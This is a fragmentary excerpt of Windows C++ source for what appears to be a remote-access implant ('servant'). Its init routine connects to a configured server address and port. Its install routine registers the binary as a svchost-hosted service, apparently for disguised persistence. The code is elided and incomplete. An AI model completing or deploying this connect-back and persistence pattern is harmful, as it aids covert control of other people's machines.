...
SERVANT_API void InitServant()
{
	...
	WSADATA wsaData = {0};
	::WSAStartup(MAKEWORD(2, 2), &wsaData);//Windows SocKNDs Asynchronous

	debugLog(_T("init servant. server : %s:%d"), a2t(g_ConfigInfo.szAddr),g_ConfigInfo.nPort);

	if (! CommManager::GetInstanceRef().Init())  //初始化
	{
...
SERVANT_API void InstallService()
{
	...
	infoLog(_T("kang %s | %s | %s | %s | %s "),a2t(g_ServiceInfo.szServiceName),a2t(g_ServiceInfo.szDisplayName),a2t(g_ServiceInfo.szServiceDecript),filePath.c_str(),SERVANT_SHELL_BINNAME);

	ServiceManager::GetInstanceRef().InstallSvchostService(
					a2t(g_ServiceInfo.szServiceName),
					a2t(g_ServiceInfo.szDisplayName),
					a2t(g_ServiceInfo.szServiceDecript),
					filePath.c_str(),
					SERVANT_SVCHOST_NAME
			);
